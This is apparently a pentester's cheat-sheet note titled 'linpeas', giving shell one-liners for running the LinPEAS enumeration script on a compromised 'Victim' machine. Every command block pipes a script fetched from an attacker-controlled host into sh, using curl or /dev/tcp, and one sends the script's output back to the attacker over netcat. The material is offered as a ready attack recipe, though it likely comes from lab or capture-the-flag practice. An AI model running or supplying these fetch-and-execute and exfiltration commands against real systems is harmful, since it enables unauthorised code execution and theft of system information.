---
id: 33dff0d7-d2b6-4410-9334-e3b63aae2455
title: linpeas
---

- <a href="#execution" id="toc-execution">Execution:</a>

# Execution:

Run from memory and send back to attacker:

``` shell
# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
